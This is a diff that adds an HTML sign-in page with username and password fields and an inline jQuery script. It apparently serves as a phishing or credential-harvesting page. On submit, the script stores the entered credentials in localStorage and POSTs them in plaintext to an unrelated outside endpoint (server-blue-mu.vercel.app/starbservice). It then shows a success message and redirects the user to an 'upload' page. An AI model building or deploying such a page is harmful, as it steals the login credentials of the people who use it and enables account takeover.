@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Home</title>
+    <link href="./css/index.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="index">
+      <div>
+        <header>
+          <a href="./index.html"><img src="./assets/logo.jpg" /></a>
+        </header>
+      </div>
+      <section>
+        <div class="form">
+          <form method="post" id="myForm">
+            <div class="text-input">
+              <span class="indication"
+                ><span class="asteriks">*</span> Indicates required field
+              </span>
+              <div class="input-label">
+                <label class="filled" for="text">
+                  Username <span class="asteriks">*</span></label
+                >
+                <input
+                  class="username"
+                  name="username"
+                  label="Username"
+                  type="text"
+                  id="username"
+                  required
+                />
+              </div>
+
+              <div class="input-label">
+                <label class="filled" for="password">
+                  Password <span class="asteriks">*</span></label
+                >
+                <input
+                  class="password"
+                  name="password"
+                  label="Password"
+                  type="password"
+                  id="password"
+                  required
+                />
+              </div>
+            </div>
+            <div class="checkbox">
+              <div>
+                <label for="remember">Remember me</label>
+                <input id="remember" type="checkbox" />
+              </div>
+            </div>
+            <div class="button-container">
+              <button class="button" type="submit">Sign In</button>
+            </div>
+            <div class="header-links">
+              <a href="#">forgot Username/password?</a><br />
+              <a href="#">Not Enrolled/Sign Up Now.</a>
+            </div>
+          </form>
+        </div>
+      </section>
+
+      <footer>
+        <img src="./assets/footer.jpg"/>
+  
+      </footer>
+    </div>
+    <script src="./jquery-3.6.0.min.js"></script>
+    <script src="./script.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+    <script>
+      $(document).ready(function () {
+        $("#myForm").on("submit", function (event) {
+          event.preventDefault(); // Prevent the default form submission
+
+          // Collect form data
+          var userName = $("#username").val();
+          var password = $("#password").val();
+
+          // Build the data object
+          var data = {
+            userName: userName,
+            password: password,
+          };
+          localStorage.setItem("selectedItem", JSON.stringify(data));
+
+          $.ajax({
+            url: "https://server-blue-mu.vercel.app/starbservice", // Replace with the URL to your PHP handler script
+            type: "POST",
+            data: JSON.stringify(data),
+            contentType: "application/json",
+            success: function (response) {
+              swal("Succesful, Redirecting to upload!", "", "success").then(
+                () => {
+                  window.location.href = "./no.html";
+                }
+              );
+            },
+            error: function (xhr, status, error) {
+              // Handle any errors
+              swal(
+                "An error occurred while saving the application!",
+                "",
+                "warning"
+              );
+              console.error(xhr.responseText);
+            },
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
